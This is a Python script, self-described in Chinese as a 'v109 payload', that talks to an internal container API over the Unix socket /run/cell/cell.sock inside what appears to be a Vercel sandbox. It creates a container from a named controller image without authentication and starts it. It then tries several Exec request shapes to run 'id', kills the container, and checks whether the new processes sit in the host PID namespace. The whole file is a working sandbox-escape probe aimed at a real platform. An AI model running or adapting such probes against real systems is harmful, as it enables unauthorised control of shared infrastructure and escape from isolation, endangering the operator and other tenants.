# -*- coding: utf-8 -*-
"""v109 payload: 操作无认证创建的容器
P1 Create -> Start -> Exec -> Kill 全链路
P2 检查新容器进程 (是否在宿主 pid ns)
P3 ProcessService 用 32hex id
输出 /vercel/sandbox/v109c.out"""
import socket, struct, time, signal, json, os

OUT = '/vercel/sandbox/v109c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(170)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=3.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 600] if hdr_end > 0 else b''
        log('CONN %s -> %s body=%r' % (path, status, payload[:400]))
        return d, status, payload
    except Exception as e:
        log('CONN %s EXC %s' % (path, type(e).__name__))
        return b'', 'EXC', b''


def ps_snapshot():
    try:
        pids = sorted(int(x) for x in os.listdir('/proc') if x.isdigit())
        return pids
    except Exception as e:
        return []


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

log('=== P1 create+start+exec ===')
pids0 = set(ps_snapshot())
log('pids before: %d' % len(pids0))

d, st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
cid = None
if pay:
    try:
        cid = json.loads(pay.decode()).get('containerId')
    except Exception:
        pass
log('containerId=%s' % cid)
if not cid:
    log('CREATE FAILED, abort')
    f.close()
    raise SystemExit

# Start
d, st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=10)
log('START -> %s %r' % (st, pay[:200]))

# 检查新进程
time.sleep(1)
pids1 = set(ps_snapshot())
new = pids1 - pids0
log('new pids after start: %s' % sorted(new)[:40])

# Exec 变体探测
for body in (
    {'containerId': cid, 'args': ['id']},
    {'container_id': cid, 'command': ['id']},
    {'containerId': cid, 'cmd': ['id']},
    {'containerId': cid, 'process': {'args': ['id']}},
):
    d, st, pay = connect_unix(CELL, '%s/Exec' % CTRS, json.dumps(body).encode(), t=6)
    log('EXEC %s -> %s %r' % (list(body)[1:], st, pay[:300]))

# Kill
d, st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid, 'signal': 9}).encode(), t=6)
log('KILL -> %s %r' % (st, pay[:200]))

# Wait
d, st, pay = connect_unix(CELL, '%s/Wait' % CTRS, json.dumps({'containerId': cid}).encode(), t=6)
log('WAIT -> %s %r' % (st, pay[:200]))

# Stdin (可能 bidi stream)
d, st, pay = connect_unix(CELL, '%s/Stdin' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('STDIN -> %s %r' % (st, pay[:200]))

# StreamOutput (流式)
d, st, pay = connect_unix(CELL, '%s/StreamOutput' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('STREAMOUT -> %s %r' % (st, pay[:200]))

# 检查容器进程是否还在
pids2 = set(ps_snapshot())
log('pids after kill: %d (new remaining: %s)' % (len(pids2), sorted(pids2 - pids0)[:20]))

log('V109C_DONE')
f.close()
